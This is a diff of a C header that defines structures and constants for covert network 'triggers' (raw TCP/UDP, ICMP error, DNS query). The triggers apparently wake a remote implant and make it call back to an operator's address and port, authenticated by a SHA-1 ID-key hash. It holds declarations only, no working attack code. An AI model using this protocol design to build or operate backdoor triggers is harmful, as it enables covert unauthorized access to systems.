@@ -17,6 +17,7 @@
 
 #include <stdio.h>
 #include <arpa/inet.h>
+#include <netinet/in.h>
 #include "trigger_network.h"
 
 /* constants for use in switching on the different possible triggers to use */
@@ -29,40 +30,51 @@
 #define T_RAW_UDP	7
 
 // Constants for building and encoding the raw TCP and UDP triggers
+#define	MIN_PACKET_SIZE		126
 #define	MAX_PACKET_SIZE		472
 #define START_PAD		8
 #define CRC_DATA_LENGTH		84
-#define PAD1_LENGTH		8
-#define PAD2_LENGTH		8
+#define RANDOM_PAD1		200
+#define RANDOM_PAD2		146
+#define PAD1			8
+#define PAD2			8
+
+#define ID_KEY_HASH_SIZE	20	// Size of SHA-1 hash
+#define ID_KEY_LENGTH_MIN	8	// Minimum character length for a trigger key
 
 /*! \struct payload
+ *
+ * 	\brief	Payload data structure
+ *
+ * 	\param in_addr_t callback_addr	- Call-back IP address
+ * 	\param uint16_t callback_port	- Call-back port
+ * 	\param uint8_t trigger_key	- Trigger key (SHA-1)
+ * 	\param uint16_t crc		- CRC of payload
  */
 typedef struct
 {
-	uint8_t seed;		// Obfuscation seed
-	uint8_t package[9];	// Trigger data
-	uint16_t crc;
+	uint8_t		seed;					// Obfuscation seed used for triggers other than raw TCP/UDP.
+	in_addr_t	callback_addr;				// the callback for the triggered application, always in net order
+	uint16_t	callback_port;				// callback port, passed to TBOT, always in net order
+	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// ID Key hash
+	uint16_t	crc;					// CRC of this payload
 } payload;
 
-/*!
+/*! \struct trigger_info
 	\brief	The struct containing trigger control parameters
 	
 	\param payload* p	- The 12 byte payload of the trigger
 	\param trigger_info* ti	- The struct containing trigger-specific parameters
-	
-	\return		The success of the call.
-	\retval         SUCCESS (0) success
-	\retval         FAILURE (-1) failure
 */
 typedef struct
 {
-	uint32_t trigger_type;		// one of the T_<trigger type> defined values
-	in_addr_t target_addr;		// the destination we are triggering, always in net order
-	in_addr_t callback_addr;	// the callback for the triggered application, always in net order
-	uint16_t callback_port;		// callback port, passed to TBOT, always in net order
-	uint16_t trigger_port;		// for raw triggers, the TCP or UDP port
-	uint8_t target_application;	// what application are we triggering?
-	uint8_t icmp_error_code;	// used for ICMP error triggers (the opcode of a payload)
+	uint32_t	trigger_type;			// one of the T_<trigger type> defined values
+	in_addr_t	target_addr;			// the destination we are triggering, always in net order
+	in_addr_t	callback_addr;			// the callback for the triggered application, always in net order
+	uint16_t	callback_port;			// callback port, passed to TBOT, always in net order
+	uint16_t	trigger_port;			// for raw triggers, the TCP or UDP port
+	uint8_t		idKey_hash[ID_KEY_HASH_SIZE];	// SHA-1 of ID key
+	uint8_t		icmp_error_code;		// used for ICMP error triggers (the opcode of a payload)
 } trigger_info;
 
 // pretty print package
@@ -112,10 +124,10 @@ extern int trigger_icmp_error (payload * p, trigger_info * ti);
 
 extern int trigger_dns_query (payload * p, trigger_info * ti);
 
-int trigger_raw_udp (payload * p, trigger_info * ti);
+//int trigger_raw_udp (payload * p, trigger_info * ti);
 
-int trigger_raw_tcp (payload * p, trigger_info * ti);
+//int trigger_raw_tcp (payload * p, trigger_info * ti);
 
-unsigned int formRawPacketData (uint8_t * data, payload * p);
+unsigned int trigger_raw (payload *p, trigger_info * ti);
 
 #endif
